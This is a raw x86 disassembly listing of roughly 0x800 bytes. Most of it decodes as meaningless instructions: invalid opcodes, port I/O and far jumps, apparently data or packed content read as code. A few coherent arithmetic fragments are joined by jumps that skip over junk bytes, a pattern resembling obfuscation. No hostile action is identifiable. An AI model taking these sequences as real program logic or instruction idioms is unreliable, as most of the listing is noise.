  411587:	pop    ds
  411588:	ins    DWORD PTR es:[edi],dx
  411589:	(bad)  
  41158a:	jno    0x4115c1
  41158c:	pop    esi
  41158d:	sbb    ebx,DWORD PTR [eax+0x2a]
  411590:	repnz push 0x77f8aa50
  411596:	mov    dl,0xba
  411598:	js     0x4115e7
  41159a:	push   esp
  41159b:	pop    edi
  41159c:	sbb    al,0xbe
  41159e:	xor    ah,bh
  4115a0:	lock push edx
  4115a2:	lods   al,BYTE PTR ds:[esi]
  4115a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115a4:	call   0x8834:0x98afc759
  4115ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115ac:	mov    eax,ds:0x93fbed86
  4115b1:	xchg   ecx,eax
  4115b2:	cmp    BYTE PTR [eax],al
  4115b4:	sub    eax,0x9ec0f739
  4115b9:	mov    esp,0xe87fbbbc
  4115be:	les    eax,FWORD PTR [edi]
  4115c0:	push   DWORD PTR [edx]
  4115c2:	pop    ecx
  4115c3:	js     0x4115b4
  4115c5:	clc    
  4115c6:	xchg   edx,eax
  4115c7:	(bad)  
  4115c8:	into   
  4115c9:	enter  0xc45b,0x49
  4115cd:	pop    ecx
  4115ce:	and    edx,DWORD PTR [edi-0x1f]
  4115d1:	rol    BYTE PTR [esi-0x79],cl
  4115d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115d5:	loop   0x4115a2
  4115d7:	xor    eax,0xe1a790a1
  4115dc:	cld    
  4115dd:	sar    BYTE PTR [ebx-0x3c],0x3a
  4115e1:	nop
  4115e2:	push   edi
  4115e3:	(bad)  
  4115e4:	jnp    0x411632
  4115e6:	pop    ebp
  4115e7:	or     edx,DWORD PTR ds:0x48419250
  4115ed:	jmp    0x4115c9
  4115ef:	or     ax,0x1f62
  4115f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115f4:	cli    
  4115f5:	les    ecx,FWORD PTR [ecx+0x184017c0]
  4115fb:	xchg   ebx,eax
  4115fc:	inc    ebx
  4115fd:	sbb    DWORD PTR [edx],esp
  4115ff:	cwde   
  411600:	gs loopne 0x41161e
  411603:	sahf   
  411604:	jns    0x41162d
  411606:	mov    dl,0x3a
  411608:	jne    0x411649
  41160a:	push   cs
  41160b:	sbb    al,BYTE PTR [eax]
  41160d:	inc    edx
  41160e:	inc    edi
  41160f:	(bad)  
  411610:	xchg   edi,eax
  411611:	cmp    DWORD PTR [esp+esi*4],0x47
  411615:	mov    bh,0x4
  411617:	jae    0x4115fb
  411619:	dec    ecx
  41161a:	in     eax,0x33
  41161c:	cld    
  41161d:	adc    al,0xee
  41161f:	mov    eax,0x73d94122
  411624:	fbstp  TBYTE PTR [esi+esi*4+0x577af868]
  41162b:	ss add al,0x67
  41162e:	cmp    al,0x43
  411630:	pop    edx
  411631:	xor    BYTE PTR [esi+0x47],al
  411634:	sub    BYTE PTR [edi],bh
  411636:	pop    edi
  411637:	sbb    DWORD PTR [ebx-0x4b9b100b],esp
  41163d:	push   ds
  41163e:	mov    edx,DWORD PTR [edi-0x501b3830]
  411644:	jg     0x4116a0
  411646:	mov    bh,0x24
  411648:	xchg   DWORD PTR [edx+0xc],esp
  41164b:	cmp    DWORD PTR [eax+0x6e],esp
  41164e:	lahf   
  41164f:	xor    al,BYTE PTR [edi-0x4a]
  411652:	mov    DWORD PTR [ebx+0x2d9ec18e],edi
  411658:	xor    DWORD PTR [eax*4+0x741b543a],edx
  41165f:	dec    ebp
  411660:	push   es
  411661:	je     0x41162d
  411663:	xor    cl,ch
  411665:	or     ebx,DWORD PTR [ebx+0x3d]
  411668:	inc    edx
  411669:	xchg   ecx,eax
  41166a:	sbb    BYTE PTR [esi],cl
  41166c:	gs pop esp
  41166e:	fucomi st,st(2)
  411670:	add    edx,DWORD PTR [ecx+0x637469cc]
  411676:	adc    BYTE PTR [edx-0x38bc13b5],0x60
  41167d:	outs   dx,BYTE PTR ds:[esi]
  41167e:	leave  
  41167f:	add    al,0xba
  411681:	mov    al,ds:0xee32d278
  411686:	ror    DWORD PTR [ecx],1
  411688:	dec    eax
  411689:	xor    al,BYTE PTR [ebx]
  41168b:	sti    
  41168c:	mov    eax,ds:0xe9a60675
  411691:	test   al,dl
  411693:	sar    DWORD PTR [eax-0x23],0x62
  411697:	push   eax
  411698:	adc    ebp,0xffffffc1
  41169b:	fwait
  41169c:	adc    al,0xb3
  41169e:	popa   
  41169f:	push   es
  4116a0:	sbb    al,0x29
  4116a2:	in     eax,0x43
  4116a4:	mov    dh,0x31
  4116a6:	xchg   esi,eax
  4116a7:	inc    esp
  4116a8:	mov    al,ds:0x8ef446a3
  4116ad:	dec    ecx
  4116ae:	in     al,dx
  4116af:	stos   BYTE PTR es:[edi],al
  4116b0:	jne    0x41168c
  4116b2:	sub    al,0x4a
  4116b4:	xchg   esi,eax
  4116b5:	sbb    BYTE PTR [ecx],ah
  4116b7:	in     al,0xbd
  4116b9:	lea    ecx,[esi-0x177fb34]
  4116bf:	jns    0x41165c
  4116c1:	shl    BYTE PTR [edx],1
  4116c3:	in     eax,dx
  4116c4:	or     al,0xcf
  4116c6:	and    BYTE PTR [ebp+0x7496ba2b],0x9d
  4116cd:	cdq    
  4116ce:	(bad)  
  4116cf:	jmp    0xc401:0x3abb9225
  4116d6:	push   edx
  4116d7:	mov    ebp,DWORD PTR [ebx+0x4de421d9]
  4116dd:	stc    
  4116de:	fcomip st,st(3)
  4116e0:	add    esp,DWORD PTR [edx]
  4116e2:	fwait
  4116e3:	push   ebx
  4116e4:	adc    eax,0xa5a61885
  4116e9:	imul   esi,DWORD PTR ds:0xbc427fec,0x93d17be5
  4116f3:	test   ebp,ecx
  4116f5:	mov    esp,ebx
  4116f7:	pusha  
  4116f8:	jmp    0x411713
  4116fa:	sub    al,0x53
  4116fc:	sbb    DWORD PTR [esp+eax*2],esi
  4116ff:	mov    ch,dl
  411701:	xor    cl,BYTE PTR [ecx+esi*4]
  411704:	push   0x4ff7b213
  411709:	sbb    edi,ecx
  41170b:	shl    BYTE PTR [ecx],1
  41170d:	mov    eax,0x6c07e00
  411712:	aam    0xae
  411714:	adc    BYTE PTR [edi+0x5],al
  411717:	stos   DWORD PTR es:[edi],eax
  411718:	aas    
  411719:	add    ecx,edi
  41171b:	mov    edi,DWORD PTR gs:[edx-0x94b36f6]
  411722:	inc    esi
  411723:	jg     0x411706
  411725:	das    
  411726:	in     eax,dx
  411727:	inc    ebp
  411728:	ret    
  411729:	out    dx,eax
  41172a:	fdiv   DWORD PTR [ebp+esi*8-0x45]
  41172e:	or     eax,0xe2a00d15
  411733:	push   edi
  411734:	nop
  411735:	rcr    DWORD PTR ds:0xf621143a,cl
  41173b:	dec    si
  41173d:	or     al,0x97
  41173f:	or     ah,BYTE PTR [eax-0x6e]
  411742:	jno    0x4116eb
  411744:	or     eax,0xf579d367
  411749:	mov    eax,0xa8ce6870
  41174e:	push   ebx
  41174f:	fst    DWORD PTR [esi+0x6a]
  411752:	pop    ecx
  411753:	mov    dh,0xa6
  411755:	or     al,0x2e
  411757:	lea    esi,[ecx-0x196eae17]
  41175d:	push   cs
  41175e:	cld    
  41175f:	outs   dx,DWORD PTR ds:[esi]
  411760:	jge    0x411757
  411762:	stc    
  411763:	push   ss
  411764:	mov    al,ss:0x70e27749
  41176a:	or     BYTE PTR [ebx],bl
  41176c:	jo     0x41178a
  41176e:	pop    edi
  41176f:	xlat   BYTE PTR ds:[ebx]
  411770:	fild   QWORD PTR [ebx+0x2]
  411773:	out    0xd3,eax
  411775:	xlat   BYTE PTR ds:[ebx]
  411776:	leave  
  411777:	sbb    eax,0x935d2320
  41177c:	jmp    0x34ae4ad2
  411781:	ja     0x4117d3
  411783:	mov    ebp,ebx
  411785:	jo     0x411712
  411787:	push   ebp
  411788:	shr    cl,1
  41178a:	call   0x8b411796
  41178f:	push   ebp
  411790:	enter  0x7d8b,0xfc
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	and    BYTE PTR [ecx+eiz*2],dl
  4117b6:	jmp    DWORD PTR [edx+eiz*2]
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	(bad)  
  4117c0:	fsub   DWORD PTR [ecx+0x56]
  4117c3:	ror    bh,1
  4117c5:	or     al,0x72
  4117c7:	daa    
  4117c8:	mov    ds:0xef0b428,eax
  4117cd:	dec    ebx
  4117ce:	xchg   ecx,eax
  4117cf:	lods   al,BYTE PTR ds:[esi]
  4117d0:	icebp  
  4117d1:	push   ebx
  4117d2:	bound  esp,QWORD PTR [edi]
  4117d4:	add    ecx,DWORD PTR [edi-0x2a]
  4117d7:	ret    
  4117d8:	sahf   
  4117d9:	pop    esi
  4117da:	inc    ebp
  4117db:	sbb    eax,0x24839ec0
  4117e0:	stos   DWORD PTR es:[edi],eax
  4117e1:	cmp    BYTE PTR [ebx+0x12],al
  4117e4:	sbb    ah,ch
  4117e6:	add    BYTE PTR [edi-0x46087aa6],ch
  4117ec:	dec    eax
  4117ed:	jp     0x4117ce
  4117ef:	jno    0x4117e0
  4117f1:	or     al,0xef
  4117f3:	pop    edx
  4117f4:	xor    ch,al
  4117f6:	scas   al,BYTE PTR es:[edi]
  4117f7:	adc    eax,0xd70ab6b5
  4117fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117fd:	rcr    DWORD PTR [esi-0x37],1
  411800:	ja     0x411802
  411802:	(bad)  
  411804:	pop    es
  411805:	aad    0x31
  411807:	jns    0x41182a
  411809:	enter  0x7767,0xca
  41180d:	sub    cl,BYTE PTR [ebx+0x15]
  411810:	es inc eax
  411812:	dec    edi
  411813:	rcl    ebx,1
  411815:	inc    esi
  411816:	mov    eax,0x47ddc21
  41181b:	fistp  QWORD PTR [ecx]
  41181d:	lock pop es
  41181f:	push   eax
  411820:	mov    ah,0x15
  411822:	cld    
  411823:	jmp    FWORD PTR [esi]
  411825:	popf   
  411826:	test   BYTE PTR [edx-0x20f7ca47],ch
  41182c:	daa    
  41182d:	jo     0x411873
  41182f:	(bad)  
  411831:	dec    al
  411833:	daa    
  411834:	or     esi,ebx
  411836:	pop    edx
  411837:	inc    ebp
  411838:	dec    edx
  411839:	xor    ebx,DWORD PTR [edi-0x4c1d6d69]
  41183f:	fwait
  411840:	push   esi
  411841:	fdiv   st(6),st
  411843:	scas   eax,DWORD PTR es:[edi]
  411844:	inc    ebp
  411845:	xor    al,0x50
  411847:	hlt    
  411848:	cmp    eax,0x6a18b897
  41184d:	xchg   esi,eax
  41184e:	popf   
  41184f:	nop
  411850:	retf   0xbb4f
  411853:	mov    DWORD PTR [ebx],edx
  411855:	pop    es
  411856:	mov    esi,0xf650dc56
  41185b:	lock mov ah,0x6c
  41185e:	das    
  41185f:	push   0xffffffcd
  411861:	jb     0x4117ea
  411863:	sbb    edi,DWORD PTR [ecx+esi*1]
  411866:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411867:	fxch   st(4)
  411869:	jmp    0xe143:0x7319b822
  411870:	push   ds
  411871:	sahf   
  411872:	push   edi
  411873:	jle    0x411831
  411875:	retf   
  411876:	xor    ch,cl
  411878:	lea    esp,[ebp-0x7dc58282]
  41187e:	sbb    dl,BYTE PTR [esi-0x1c641570]
  411884:	rol    DWORD PTR [esi],cl
  411886:	jmp    0xaba2:0x59bf9be1
  41188d:	jmp    0x7b34:0x397446f3
  411894:	mov    bl,0xb3
  411896:	pop    esi
  411897:	pop    es
  411898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411899:	or     BYTE PTR [ecx+ecx*2+0x5c9eca6d],ch
  4118a0:	xchg   BYTE PTR [eax+eiz*8-0x2f],al
  4118a4:	gs push ds
  4118a6:	add    eax,0x55070f0a
  4118ab:	pop    ss
  4118ac:	add    DWORD PTR [edx],esi
  4118ae:	and    DWORD PTR [ebp+ecx*2+0x2b72e4d5],ecx
  4118b5:	lds    edi,FWORD PTR [edx+eax*1+0x6]
  4118b9:	dec    ecx
  4118ba:	push   esp
  4118bb:	push   edx
  4118bc:	imul   edx,DWORD PTR [edx+ecx*4-0x3d],0x2f189f73
  4118c4:	xor    al,cl
  4118c6:	inc    edx
  4118c7:	sub    edx,ebx
  4118c9:	jp     0x41193b
  4118cb:	cmp    DWORD PTR [ecx+eiz*8],ebx
  4118ce:	aaa    
  4118cf:	sbb    ah,BYTE PTR [ebx]
  4118d1:	xchg   edi,eax
  4118d2:	ins    DWORD PTR es:[edi],dx
  4118d3:	pusha  
  4118d4:	rcr    DWORD PTR [ebx],0x9e
  4118d7:	dec    edx
  4118d8:	ja     0x4118aa
  4118da:	in     al,0xf
  4118dc:	cld    
  4118dd:	cdq    
  4118de:	dec    ecx
  4118df:	and    edi,DWORD PTR [esi]
  4118e1:	xor    esp,edi
  4118e3:	and    BYTE PTR [ecx+0x5e],ch
  4118e6:	shr    ebx,0x4b
  4118e9:	mov    eax,0x602a687e
  4118ee:	scas   al,BYTE PTR es:[edi]
  4118ef:	fld    TBYTE PTR [eax]
  4118f1:	sub    DWORD PTR [eax-0x111f1f9c],ebp
  4118f7:	test   DWORD PTR [edx+0x11ee3010],esp
  4118fd:	mov    ch,0x96
  4118ff:	fbld   TBYTE PTR [ebp-0x29]
  411902:	ins    DWORD PTR es:[edi],dx
  411903:	sbb    eax,0x9a1f21b9
  411908:	sub    cl,BYTE PTR [ebx]
  41190a:	lahf   
  41190b:	in     eax,0x38
  41190d:	fsubr  DWORD PTR [esi-0x5572430c]
  411913:	sub    dh,bh
  411915:	mov    edi,0xc952977c
  41191a:	call   0xa801:0xa332aa40
  411921:	sub    ecx,ecx
  411923:	arpl   WORD PTR [edx],sp
  411925:	pusha  
  411926:	pop    ebp
  411927:	pop    ds
  411928:	les    ecx,FWORD PTR [ecx]
  41192a:	out    dx,al
  41192b:	cli    
  41192c:	or     bl,BYTE PTR [edi+0x6006f9a6]
  411932:	retf   0x7b98
  411935:	or     al,0x7a
  411937:	or     eax,0x3756afa8
  41193c:	ss out 0x65,eax
  41193f:	(bad)  
  411940:	out    0xd4,eax
  411942:	adc    esi,DWORD PTR [ebx-0x3f]
  411945:	outs   dx,DWORD PTR ds:[esi]
  411946:	out    0x5,eax
  411948:	ins    BYTE PTR es:[edi],dx
  411949:	dec    edx
  41194a:	jge    0x41194e
  41194c:	test   DWORD PTR [edi+esi*1-0x1c10d277],eax
  411953:	jo     0x411955
  411955:	mov    ecx,0x25f88497
  41195a:	mov    ebp,0x7c9fadb
  41195f:	or     dh,BYTE PTR [eax+edx*4+0xa]
  411963:	jae    0x41199f
  411965:	scas   eax,DWORD PTR es:[edi]
  411966:	xchg   DWORD PTR [eax-0x40],ecx
  411969:	out    0x94,al
  41196b:	xchg   edi,eax
  41196c:	mov    ds,esi
  41196e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41196f:	pop    edx
  411970:	mov    eax,ds:0xb7938eb0
  411975:	inc    edx
  411976:	int    0x51
  411978:	in     eax,0xf5
  41197a:	xchg   esp,eax
  41197b:	cmp    esp,edx
  41197d:	push   eax
  41197e:	(bad)  
  41197f:	mov    bl,0xd3
  411981:	sub    dh,ah
  411983:	(bad)  
  411984:	out    dx,eax
  411985:	xchg   esp,eax
  411986:	adc    eax,0x318b5597
  41198b:	out    0xb9,al
  41198d:	adc    eax,0xdf99917b
  411992:	mov    ah,0x2f
  411994:	cmp    DWORD PTR [eax+0x33],edx
  411997:	or     esi,DWORD PTR [edx]
  411999:	mov    al,al
  41199b:	fmul   st(5),st
  41199d:	(bad)  
  41199f:	push   ecx
  4119a0:	les    ebx,FWORD PTR [edi]
  4119a2:	xchg   esp,eax
  4119a3:	add    ah,ah
  4119a5:	sbb    DWORD PTR [edi+0x68],edi
  4119a8:	jne    0x4119bc
  4119aa:	jnp    0x4119ff
  4119ac:	loop   0x411974
  4119ae:	in     eax,0xdc
  4119b0:	push   cs
  4119b1:	sbb    ebp,ecx
  4119b3:	mov    ds:0xf59e08d1,eax
  4119b8:	sbb    DWORD PTR [esi-0x8],ebx
  4119bb:	mov    ebp,0x8cd7dd43
  4119c0:	loop   0x4119a4
  4119c2:	push   esi
  4119c3:	sbb    al,bl
  4119c5:	sbb    DWORD PTR [eax],edi
  4119c7:	stos   BYTE PTR es:[edi],al
  4119c8:	jb     0x4119b6
  4119ca:	mov    ds:0x15845c5b,eax
  4119cf:	stc    
  4119d0:	mov    ch,0xe5
  4119d2:	ja     0x4119a9
  4119d4:	(bad)  
  4119d5:	fdivr  st(4),st
  4119d7:	pop    es
  4119d8:	xchg   ecx,eax
  4119d9:	rcr    DWORD PTR [edi+ebp*2-0x6fa3038c],1
  4119e0:	mov    ch,0x69
  4119e2:	das    
  4119e3:	ds int 0x5b
  4119e6:	mov    ds,WORD PTR ds:0xa2ca7900
  4119ec:	jbe    0x411a66
  4119ee:	cmp    DWORD PTR [esi],0x17
  4119f1:	call   0x97852c11
  4119f6:	jns    0x41198e
  4119f8:	or     al,0x3f
  4119fa:	cli    
  4119fb:	pop    ds
  4119fc:	pop    eax
  4119fd:	mov    WORD PTR [edi+eiz*2-0x72],ds
  411a01:	adc    DWORD PTR [edx-0x2b1a957b],esi
  411a07:	lds    ebx,FWORD PTR [edx-0x41]
  411a0a:	dec    ebp
  411a0b:	pop    ebx
  411a0c:	stos   DWORD PTR es:[edi],eax
  411a0d:	je     0x411997
  411a0f:	js     0x411a84
  411a11:	int3   
  411a12:	adc    eax,0xb35674eb
  411a17:	jge    0x411a64
  411a19:	mov    edx,0xe46f2984
  411a1e:	sub    esi,DWORD PTR [edx+0x47125da4]
  411a24:	pop    ebp
  411a25:	mov    al,ds:0x66657cf2
  411a2a:	mov    ebx,DWORD PTR [ebp-0x10]
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0xf9d7da8b
  411a62:	nop
  411a63:	(bad)  
  411a65:	xchg   ecx,eax
  411a66:	pusha  
  411a67:	js     0x411ae1
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	cld    
  411a6e:	jp     0x411a19
  411a70:	cs mov cl,0x5
  411a73:	cmp    al,0x28
  411a75:	hlt    
  411a76:	test   bl,bl
  411a78:	pushf  
  411a79:	sub    eax,0x4162b04f
  411a7e:	cmp    BYTE PTR [edi+0x77],ch
  411a81:	icebp  
  411a82:	lea    ebx,[ebx-0x37]
  411a85:	imul   edi,DWORD PTR [edx],0xc6e70a42
  411a8b:	sub    ch,ah
  411a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a8e:	jb     0x411a4a
  411a90:	mov    ecx,0xd9fce919
  411a95:	sti    
  411a96:	(bad)  
  411a98:	gs sub esi,0xd623c1d3
  411a9f:	jge    0x411ad3
  411aa1:	add    BYTE PTR [edi-0x2a],bh
  411aa4:	sbb    ah,BYTE PTR [edi-0x5fa0fc7c]
  411aaa:	adc    ah,BYTE PTR [edx+esi*2]
  411aad:	mov    eax,ds:0xc038f339
  411ab2:	pop    ebp
  411ab3:	inc    esi
  411ab4:	das    
  411ab5:	and    ebx,edi
  411ab7:	cmp    al,0xc2
  411ab9:	mov    ah,0x30
  411abb:	ret    0xd304
  411abe:	popf   
  411abf:	or     DWORD PTR [esi-0x6d],0x3bba224c
  411ac6:	push   esi
  411ac7:	jecxz  0x411a70
  411ac9:	jb     0x411b26
  411acb:	sub    BYTE PTR [ecx+0x38],bh
  411ace:	or     eax,0xd7959436
  411ad3:	xor    BYTE PTR [eax+0x77],bl
  411ad6:	(bad)  
  411ad7:	xor    esp,ebp
  411ad9:	clc    
  411ada:	ins    DWORD PTR es:[edi],dx
  411adb:	xchg   ecx,ecx
  411add:	adc    al,BYTE PTR [ebp+0x27]
  411ae0:	cdq    
  411ae1:	js     0x411a8a
  411ae3:	test   BYTE PTR [ebx+0x7cdbf7cf],ch
  411ae9:	pop    ecx
  411aea:	add    cl,BYTE PTR [eax+0x6]
  411aed:	pop    ebx
  411aee:	pop    ebp
  411aef:	dec    edi
  411af0:	push   edx
  411af1:	mov    ch,0x5c
  411af3:	mov    bh,0xe1
  411af5:	mov    ?,WORD PTR [eax+0xc]
  411af8:	js     0x411af5
  411afa:	and    BYTE PTR ds:0x608e87a3,bh
  411b00:	xor    BYTE PTR [esi+ebx*1-0x36],dh
  411b04:	lock sbb al,0x58
  411b07:	ins    BYTE PTR es:[edi],dx
  411b08:	(bad)  
  411b09:	mov    eax,ds:0x303156e8
  411b0e:	jle    0x8c9bf946
  411b14:	pop    es
  411b15:	out    0x81,eax
  411b17:	sub    ch,BYTE PTR [ebx+0x12e068a2]
  411b1d:	jns    0x411ab4
  411b1f:	lods   eax,DWORD PTR ds:[esi]
  411b20:	rol    DWORD PTR [esi-0x61b2f8bc],0xa5
  411b27:	ja     0x411b3e
  411b29:	add    dl,cl
  411b2b:	outs   dx,BYTE PTR ds:[esi]
  411b2c:	jno    0x411b08
  411b2e:	ss mov edi,0x47607653
  411b34:	retf   
  411b35:	cmp    eax,0xab5b59f4
  411b3a:	out    dx,al
  411b3b:	sub    BYTE PTR [edi-0x21],bl
  411b3e:	jns    0x411b31
  411b40:	cmp    ebx,DWORD PTR [esi]
  411b42:	arpl   WORD PTR [esi-0x6],bx
  411b45:	inc    edx
  411b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b47:	(bad)  [ebx-0x71]
  411b4a:	mov    ds:0xa65e9e65,al
  411b4f:	xchg   esp,eax
  411b50:	pop    edi
  411b51:	call   0x644c:0x614ee04e
  411b58:	std    
  411b59:	fistp  QWORD PTR [ebp+0x157376b6]
  411b5f:	stc    
  411b60:	pop    edi
  411b61:	push   edx
  411b62:	or     cl,ch
  411b64:	fucomip st,st(1)
  411b66:	sub    edi,DWORD PTR [ebx]
  411b68:	mov    ebx,0x9033b4bd
  411b6d:	dec    ebx
  411b6e:	retf   
  411b6f:	cmc    
  411b70:	jne    0x411b70
  411b72:	pop    edi
  411b73:	mov    al,0x43
  411b75:	(bad)  [esi]
  411b77:	fdiv   DWORD PTR ds:0x1a653091
  411b7d:	in     eax,dx
  411b7e:	aas    
  411b7f:	enter  0x79f2,0xd2
  411b83:	jecxz  0x411b61
  411b85:	pop    ecx
  411b86:	dec    ebx
  411b87:	sbb    al,0x71
  411b89:	push   0xfede3241
  411b8e:	aad    0x1e
  411b90:	mov    dh,0xc0
  411b92:	stc    
  411b93:	push   cs
  411b94:	scas   eax,DWORD PTR es:[edi]
  411b95:	adc    BYTE PTR [ebx+ebx*8],0x28
  411b99:	mov    ah,0x92
  411b9b:	mov    ebx,0x26f902fd
  411ba0:	int3   
  411ba1:	inc    BYTE PTR [edi]
  411ba3:	jmp    0x411b75
  411ba5:	sbb    DWORD PTR [edx+0x6b],0xf4a9fdb0
  411bac:	sbb    al,0x17
  411bae:	add    edx,DWORD PTR ds:0x8468751a
  411bb4:	cmp    esi,esp
  411bb6:	std    
  411bb7:	mov    ah,0xa5
  411bb9:	ficom  DWORD PTR [ecx-0x22]
  411bbc:	sti    
  411bbd:	in     eax,0x35
  411bbf:	int    0x43
  411bc1:	sti    
  411bc2:	push   ecx
  411bc3:	add    al,0x2f
  411bc5:	inc    ebx
  411bc6:	popa   
  411bc7:	mov    ah,0x60
  411bc9:	jge    0x411c24
  411bcb:	out    0x91,al
  411bcd:	jmp    0xa52a:0x977bf699
  411bd4:	dec    edx
  411bd5:	mov    al,ds:0xa57bcae2
  411bda:	loope  0x411b93
  411bdc:	inc    ebp
  411bdd:	das    
  411bde:	sbb    dl,ah
  411be0:	je     0x411b8e
  411be2:	push   esi
  411be3:	in     al,dx
  411be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411be5:	xor    ecx,DWORD PTR [ebx]
  411be7:	mov    esp,0x7eff99ec
  411bec:	cmp    ecx,DWORD PTR [edi+edi*8+0x73]
  411bf0:	ins    DWORD PTR es:[edi],dx
  411bf1:	aad    0x2
  411bf3:	mov    ebx,DWORD PTR [edx-0x51c4d4eb]
  411bf9:	push   ebp
  411bfa:	or     ch,BYTE PTR [edi-0x39]
  411bfd:	add    DWORD PTR [ebx-0x45],edi
  411c00:	sbb    ebp,eax
  411c02:	(bad)  [ecx+0x238861a7]
  411c08:	enter  0xf2b0,0x64
  411c0c:	ds aaa 
  411c0e:	shl    bl,cl
  411c10:	sub    eax,ecx
  411c12:	in     eax,0xed
  411c14:	mov    ebp,0xf8427fc6
  411c19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c1a:	pop    ss
  411c1b:	xor    BYTE PTR [esi-0x5a],bl
  411c1e:	daa    
  411c1f:	xor    eax,0x9015adc2
  411c24:	aaa    
  411c25:	xor    DWORD PTR [eax-0x43026681],edx
  411c2b:	sub    DWORD PTR [ebp-0x15a9ccc4],0xe6d3c4e2
  411c35:	in     eax,dx
  411c36:	in     al,0xb3
  411c38:	cmc    
  411c39:	mov    ebx,edx
  411c3b:	hlt    
  411c3c:	sbb    edi,DWORD PTR [edx]
  411c3e:	add    eax,0x344894a9
  411c43:	add    bh,ch
  411c45:	in     al,dx
  411c46:	push   es
  411c47:	pop    ecx
  411c48:	mov    ds:0xbcde828e,eax
  411c4d:	rol    BYTE PTR [ebx-0x5d50aad8],cl
  411c53:	inc    ecx
  411c54:	pusha  
  411c55:	mov    ds:0x148c5338,al
  411c5a:	xchg   esp,eax
  411c5b:	sub    bl,BYTE PTR [esi]
  411c5d:	daa    
  411c5e:	or     ecx,DWORD PTR [ecx+0x73]
  411c61:	push   edx
  411c62:	mov    cl,0x45
  411c64:	add    bl,BYTE PTR [eax+0x1bb51c1f]
  411c6a:	jne    0x411c69
  411c6c:	and    dl,BYTE PTR [ebp-0x4f]
  411c6f:	fs sbb eax,0xf8ba8c15
  411c75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c76:	(bad)  
  411c77:	scas   al,BYTE PTR es:[edi]
  411c78:	jae    0x411c75
  411c7a:	xchg   ebp,eax
  411c7b:	fbld   TBYTE PTR [ecx+ebp*2-0x4b51f32d]
  411c82:	stc    
  411c83:	cmc    
  411c84:	jns    0x411c85
  411c86:	jle    0x411cf3
  411c88:	mov    ah,0x39
  411c8a:	ret    
  411c8b:	inc    ebp
  411c8c:	fisttp DWORD PTR [edi+edi*8+0x11]
  411c90:	xor    eax,0x4c48c20f
  411c95:	pushf  
  411c96:	xor    DWORD PTR [ebx-0x4e69ed35],edi
  411c9c:	popf   
  411c9d:	and    dl,0x4c
  411ca0:	mov    WORD PTR [ebx],cs
  411ca2:	pop    es
  411ca3:	or     DWORD PTR [edx],edi
  411ca5:	pop    ebx
  411ca6:	sub    al,0xec
  411ca8:	mov    WORD PTR [edx+0x30],gs
  411cab:	jo     0x411cd2
  411cad:	cdq    
  411cae:	in     al,0x43
  411cb0:	pop    ss
  411cb1:	lods   al,BYTE PTR ds:[esi]
  411cb2:	xor    esp,DWORD PTR [ecx+0x70]
  411cb5:	mov    eax,0xbae19c58
  411cba:	je     0x411cf5
  411cbc:	xchg   ebp,eax
  411cbd:	out    0x41,eax
  411cbf:	dec    edi
  411cc0:	inc    ebx
  411cc1:	dec    ebx
  411cc2:	mul    BYTE PTR [ecx+eax*2]
  411cc5:	inc    ebp
  411cc6:	mov    ah,0x43
  411cc8:	pushf  
  411cc9:	icebp  
  411cca:	inc    esp
  411ccb:	mov    cl,0xe7
  411ccd:	pop    ss
  411cce:	ins    DWORD PTR es:[edi],dx
  411ccf:	or     edi,edi
  411cd1:	push   ebp
  411cd2:	fld    QWORD PTR [ebx-0x145e90e1]
  411cd8:	mov    edi,DWORD PTR [ebp-0x8]
  411cdb:	mov    ebx,DWORD PTR [ebp-0x10]
  411cde:	sub    ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0xed66579e
  411cfd:	mov    ebp,DWORD PTR [esi+ebx*4+0x7e]
  411d01:	gs js  0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	dec    esp
  411d09:	xor    edi,DWORD PTR [ecx+0x5f18836e]
  411d0f:	out    dx,eax
  411d10:	ror    ecx,cl
  411d12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d13:	dec    DWORD PTR [esi]
  411d15:	cmp    ebp,DWORD PTR [edi-0x55e98132]
  411d1b:	add    ecx,ebx
  411d1d:	pop    edx
  411d1e:	xlat   BYTE PTR ds:[ebx]
